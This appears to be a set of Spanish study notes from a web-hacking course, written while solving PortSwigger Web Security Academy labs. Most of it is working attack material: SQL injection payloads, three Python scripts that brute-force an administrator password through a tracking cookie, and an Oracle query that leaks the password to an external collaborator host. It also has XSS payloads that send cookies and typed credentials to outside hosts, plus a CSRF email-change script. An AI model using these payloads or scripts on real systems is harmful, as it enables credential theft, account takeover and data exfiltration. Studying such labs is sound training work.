# Curso web s4vitar

## SQL

```
select id, username from users where id = '1' 
union select "test", group_concat(schema_name) from information_schema.schemata; -- '
```

### ¿Qué hace?

* Realiza **SQL Injection** usando `UNION` para combinar el resultado original con datos del sistema.
* La parte inyectada usa `group_concat(schema_name)` para obtener **todos los nombres de bases de datos** en una sola fila, separados por comas.

```
| id   | username                                              |
|------|-------------------------------------------------------|
| 1    | administrator                                         |
| test | information_schema,mysql,performance_schema,sys,login |
```

### ¿Por qué usar `group_concat` en vez de `LIMIT 0,1`?

* `LIMIT 0,1` solo devuelve una base de datos (una fila).
* `group_concat` concatena todas en un único resultado.
* Permite extraer toda la lista de bases de datos en **un solo paso**, de forma más eficiente.

### Ataque UNION

```
'
' order by 2-- - #para mirar cuántas columnas
' union select NULL, schema_name from information_schema.schemata-- -
' union select NULL, table_name from information_schema.tables where table_schema='public'
' union select NULL, column_name from information_schema.columns where table_schema='public' and table_name='users'-- -
' union select NULL, username||':'||password from users-- -
```

### Blind SQL

```
' 1=1-- -
' (select 'a')='a'-- - #meter subquery
' and (select 'a' from users where username='administrator')='a'-- -
' and (select substring(password,1,1) from users where username='administrator')='a'-- -
'and (select substring(password,1,1) from users where username='administrator' and lenght(password)=20)='a'-- -
```

SCRIPT 1

```
import sys
import signal
import string
import time
import requests
from termcolor import colored

def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo...\n", 'red'))
    p1.failure("Ataque de fuerza bruta detenido")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits
password = ''

p2=log.progress("Password")
def makeSQLi():
    print(colored("[*] Iniciando ataque de fuerza bruta", 'yellow'))
    time.sleep(2)

    for position in range(1, 21):
        for character in characters:
            payload = f"f0tYdW3TiOpJdmnVo' and (select substring(password,{position},1) from users where username='administrator')='{character}'-- -"
            cookies = {
                'TrackingId': payload,
                'session': 'xkwHU4bggBmEx0ijIEHAyx0fgb60eemG'
            }

            print(colored(f"[*] Probando: posición {position}, caracter '{character}'", 'blue'))

            r = requests.get("https://0afd00540433ac10815c1df5003a00c5.web-security-academy.net", cookies=cookies)

            if "Welcome back" in r.text:
                password+=character
                p2.status(passsword)
                break

if __name__ == '__main__':
    makeSQLi()
```

BIND EN ORACLE

```
'||(select case when length(password)=20 then to_char(1/0) else '' end from users where username='administrator')||'
'||(select case when substr(password,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'
```

SCRIPT 2

```
#!/usr/bin/env python3

from pwn import *
from termcolor import colored
import requests
import signal
import sys
import string
import time

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits
p1 = log.progress("SQLi")

def makeSQLi():
    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)

    password = ""
    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                "TrackingId": f"opTM4Ic5M3tdYiBB'||(select case when substr(password,{position},1)='{character}' then to_char(1/0) else '' end from users where username='administrator')||'",
                "session": "eeBjOF3YK4uowytMt8WtFXH7U4GcOVo"
            }

            p1.status(cookies["TrackingId"])

            r = requests.get("https://0a5c000504a13a58809508d700a200a2.web-security-academy.net", cookies=cookies)

            if r.status_code == 500:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeSQLi()
```

VISIBLE ERROR BASED SQL

```
' or 1=cast((select username from users limit 1) as INT)-- -
' or 1=cast((select password from users limit 1) as INT)-- -
```

BLIND SQL TIME DELAYS

```
'||pg_sleep(10)-- - #postgresql
and select sleep(10)-- #mysql
```

TIME DELAY TO GET IMPORTANT INFORMATION

```
'%3b select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(5) else pg_sleep(10) end-- - 
```

```
#!/usr/bin/env python3

from pwn import *
from termcolor import colored

import requests
import signal
import sys
import string
import time

def def_handler(sig, frame):
    p1.failure("")
    print(colored("\n[!] Saliendo...\n", 'red'))
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits
p1 = log.progress("SQLi")

def makeSQLI():
    password = ""

    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': f"test'%3b select case when(username='administrator' and substring(password,{position},1)='{character}') then pg_sleep(2) else pg_sleep(0) end from users-- -",
                'session': 'Likdyr1YeNj01gP3QJCEYLboh2e6q4GM'
            }

            p1.status(cookies["TrackingId"])

            time_start = time.time()

            r = requests.get("https://0aa100ed04832e02817c438800da0056.web-security-academy.net", cookies=cookies)

            time_end = time.time()

            if time_end - time_start > 2:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeSQLI()
```

OUT-OF-BAND INTERACTION

<figure><img src="../.gitbook/assets/image (1472).png" alt=""><figcaption></figcaption></figure>

> Hay que urlcodearlo ciertos caracteres

EXTRAER INFO

```
' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.em465lc8ntonsu7rwg3gtectkkqce52u.oastify.com/">]>'),'/1') FROM dual-- ;
```

{% hint style="warning" %}
Extensión HackVector
{% endhint %}

```
1 union select password from users where username='administrator'
```

```
1 union select username||';'||password from users
```

## XSS

<pre><code><strong>https://test.com&#x26;apos;+alert(0)+&#x26;apos;
</strong></code></pre>

### Evitar signos angulares, comillas simples y dobles, barras invertidas y las propias comillas invertidas

```
${alert(0)}
```

### XSS para robar cookies

Copiar el payload del Burp Collaborator

```
<script>
fetch("enlacepayload/?cookie=" +
btoa(document.cookie));
</script>
```

Vamos a almacenamiento y en session copiamos la cadena decodificada. Recargar página.

### XSS robar contraseña

```
Introduce tus credenciales para ver el post:<br><br>

Usuario: <input name=username id=username onchange="fetch('https://312idkkpby7safgl6702f7t0jrpidc11.oastify.com?username=' + this.value)"><br><br>
Password: <input name=password id=password type=password onchange="fetch('https://312idkkpby7safgl6702f7t0jrpidc11.oastify.com?password=' + this.value)">
```

Lo posteamos y le damos a pull now en Burp Collaborator.

### XSS para CSRF

```
<script>
var req = new XMLHttpRequest();
req.open("GET", "/my-account", false);
req.send();
var response = req.responseText;
var csrf_token = response.match(/name="csrf" value="(.*?)"/)[1];
var req2 = new XMLHttpRequest();
req2.open('POST', '/my-account/change-email', true);
req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
var data = "email=" + encodeURIComponent("pwned@pwned.com") + "&csrf=" + encodeURIComponent(csrf_token);
req2.send(data);
</script>
```

### Escape de sandbox AngularJS sin cadenas

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Miramos la versión y la mejor opción. Este es el trozo de código.

```
angular.module('labApp', []).controller('vulnCtrl', function($scope, $parse) {
    $scope.query = {};
    var key = 'search';
    $scope.query[key] = 'testing';
    $scope.value = $parse(key)($scope.query);
});

```

scope -> objeto especial -> controlador/vista

parse-> servicio que interpreta Angular user.name&#x20;

```
toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

### XSS con angular y CSP

```
<script>
location = 'https://0a1800f803f34c108bfd2100d600aa.web-security-academy.net/?search=<input id=x ng-focus=$event.composedPath()|orderBy:\'(z=alert)(document.cookie)\'>#x';
</script>
```

### XSS Reflect Handler y href atributos&#x20;

Hacemos con el Intruder las etiquetas como en anteriores labs.

```
<svg><a><animate attributeName=href values=javascript:alert(0) /><text x=30 y=30>Click me!</text></a>
```

## XSS en javascript: con caracteres limitados

